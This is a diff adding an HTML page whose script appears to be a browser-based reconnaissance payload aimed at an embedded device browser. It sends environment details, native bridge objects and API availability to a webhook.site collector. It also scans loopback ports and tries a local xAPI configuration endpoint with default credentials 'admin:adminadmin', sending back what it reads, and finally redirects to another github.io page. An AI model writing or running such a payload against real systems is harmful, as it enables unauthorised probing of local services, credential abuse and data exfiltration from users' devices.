@@ -1,0 +1,49 @@
+<html><body><script>
+// w3: bridge/env + loopback port verdicts (async per-port) + navigation chaining (counter-based, no setTimeout)
+var SINK = 'https://webhook.site/049dead9-0020-41f4-83e7-942e265e5d6d';
+function beacon(t, v){
+  try { fetch(SINK + '?t=' + encodeURIComponent(t) + '&v=' + encodeURIComponent(String(v).slice(0,170)), {mode:'no-cors'}); } catch(e) {}
+}
+function keys(o){ try { return Object.getOwnPropertyNames(o).slice(0,20).join(','); } catch(e){ return 'ERR'; } }
+function T(n, o){ try { return n + '=' + (typeof o) + (o && typeof o === 'object' ? '(' + keys(o) + ')' : ''); } catch(e){ return n + '=ERR'; } }
+
+beacon('start', location.href.slice(0,70));
+try { window.name = 'w3-marked'; } catch(e){}
+beacon('env', ['isSecureContext=' + self.isSecureContext, 'webdriver=' + navigator.webdriver,
+  'coi=' + self.crossOriginIsolated, 'top=' + (self.top === self), 'ua_data=' + (navigator.userAgentData ? 1 : 0)].join(' '));
+beacon('api', ['idb=' + (typeof indexedDB), 'webkitFS=' + (typeof webkitRequestFileSystem),
+  'persist=' + (typeof navigator.webkitPersistentStorage), 'caches=' + (typeof caches),
+  'savePicker=' + (typeof showSaveFilePicker), 'sw=' + (typeof navigator.serviceWorker),
+  'subtle=' + (typeof crypto.subtle), 'speech=' + (typeof speechSynthesis)].join(' '));
+
+var objs = [['qt', self.qt], ['wct', self.webChannelTransport], ['qwc', self.QWebChannel],
+  ['external', self.external], ['barco', self.barco], ['bridge', self.bridge], ['native', self.native],
+  ['qtwebengine', self.qtwebengine], ['cef', self.cef], ['webkit', self.webkit], ['chrome', self.chrome]];
+var line = [];
+for (var i = 0; i < objs.length; i++) { var s = T(objs[i][0], objs[i][1]); if (s.indexOf('=undefined') < 0) line.push(s); }
+beacon('bridges', line.length ? line.join(' ') : 'none-defined');
+
+// --- loopback: fetch no-cors resolves whenever an HTTP server answers (any status, no CORS needed) ---
+var ports = [4003, 443, 80, 8080, 5000, 3000, 47000, 7000, 22, 6542, 8081];
+var pending = ports.length + 1;   // +1 = xapi probe
+function settled(){
+  pending--;
+  if (pending === 0) {
+    beacon('nav', 'all-settled, navigating');
+    try { location.href = 'https://tapczanpawel-walijak5cali.github.io/n1.html'; } catch(e){ beacon('nav', 'THROW'); }
+  }
+}
+ports.forEach(function(p){
+  fetch('http://127.0.0.1:' + p + '/', { mode: 'no-cors', cache: 'no-store' })
+    .then(function(r){ beacon('p' + p, 'LIVE type=' + r.type + ' st=' + r.status); settled(); })
+    .catch(function(e){ beacon('p' + p, 'DEAD ' + String(e.name)); settled(); });
+});
+
+// --- XAPI from the renderer (creds; readable only if the API sends CORS headers) ---
+try {
+  fetch('http://127.0.0.1:4003/v2/configuration/system/status', {
+    mode: 'cors', cache: 'no-store', headers: { 'Authorization': 'Basic ' + btoa('admin:adminadmin') }
+  }).then(function(r){ return r.text().then(function(t){ beacon('xapi', 'st=' + r.status + ' len=' + t.length + ' head=' + t.slice(0,50)); settled(); }); })
+   .catch(function(e){ beacon('xapi', 'ERR ' + String(e.name)); settled(); });
+} catch(e){ beacon('xapi', 'THROW'); settled(); }
+</script></body></html>
